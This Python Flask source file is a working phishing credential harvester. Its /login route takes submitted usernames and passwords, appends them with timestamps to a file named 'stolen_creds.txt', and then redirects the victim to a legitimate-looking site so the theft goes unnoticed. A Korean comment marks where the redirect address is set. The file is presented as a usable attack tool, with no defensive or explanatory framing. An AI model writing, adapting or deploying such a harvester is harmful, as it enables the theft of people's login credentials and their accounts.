from flask import Flask, request, render_template, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user_id = request.form.get('username')
        password = request.form.get('password')

        with open('stolen_creds.txt', 'a') as f:
            f.write(f"[{datetime.now()}] ID: {user_id}, PW: {password}\n")

        return redirect('https://doctor-future.com/login')  # 원하는 리디렉션 주소
    return render_template('login.html')

@app.route('/')
def index():
    return redirect('/login')

@app.route('/test_redirect')
def test_redirect():
    return redirect('https://naver.com')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
